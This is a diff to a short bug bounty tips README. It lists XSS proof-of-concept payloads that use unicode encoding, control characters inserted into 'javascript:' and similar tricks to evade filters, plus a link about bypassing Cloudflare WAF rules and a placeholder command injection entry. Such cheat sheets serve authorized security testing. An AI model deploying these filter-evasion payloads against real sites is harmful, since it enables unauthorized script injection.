@@ -1,5 +1,6 @@
 # BugBounty_tips
 
+
 #Xss
 %u003Csvg onload=alert(1)> \
 %u3008svg onload=alert(2)> \
@@ -17,6 +18,10 @@ java%07script:prompt`0`
 java%09scrip%07t:prompt`0`
 jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
 pjavascriptt:confirm`0`
+
+evasionwaf
+https://0xjin.medium.com/new-xss-bypass-cloudflare-filters-2a878c01d312
+
 
 #Command Injection
 url/cgi-bin/parameter=payload
